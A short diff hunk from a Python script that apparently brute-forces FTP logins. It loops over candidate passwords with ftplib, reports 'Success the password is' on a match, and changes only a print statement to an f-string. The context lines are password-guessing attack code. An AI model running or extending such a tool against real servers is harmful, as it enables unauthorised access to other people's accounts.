@@ -13,7 +13,7 @@ try:
             try:
                 ftp = ftplib.FTP(server)
                 ftp.login(user, word)
-                print("Success the password is: " + word)
+                print(f"Success the password is: {word}")
             except ftplib.error_perm as exc:
                 print('Still trying....', exc)
 except Exception as exc:
